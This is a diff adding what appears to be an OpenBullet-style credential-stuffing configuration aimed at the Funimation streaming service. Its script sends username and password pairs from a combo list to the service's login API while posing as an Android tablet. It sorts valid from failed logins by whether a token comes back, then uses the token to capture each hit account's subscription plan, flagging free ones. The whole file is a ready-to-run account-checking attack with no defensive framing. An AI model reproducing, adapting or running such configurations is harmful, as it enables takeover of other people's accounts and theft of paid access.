@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "Funimation ",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-08T00:14:37.8454802-05:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://prod-api-funimationnow.dadcdigital.com/api/auth/login/" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "X-NewRelic-ID: VQcHVlVUDhABVlVVAwQPVw==" 
+  HEADER "devicetype: Android Tablet" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Content-Length: 57" 
+  HEADER "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-N9005 Build/NJH47F)" 
+  HEADER "Host: prod-api-funimationnow.dadcdigital.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "Failed Authentication" 
+PARSE "<SOURCE>" LR "{\"token\":\"" "\"," -> VAR "TOKEN" 
+REQUEST GET "https://prod-api-funimationnow.dadcdigital.com/api/source/user/" 
+  
+  HEADER "devicetype: Android Tablet" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-N9005 Build/NJH47F)" 
+  HEADER "Host: prod-api-funimationnow.dadcdigital.com" 
+  HEADER "Authorization: Token <TOKEN>" 
+PARSE "<SOURCE>" LR "plan\":\"" "\"," -> CAP "Plan" 
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\",\"plan\":\"Free " 
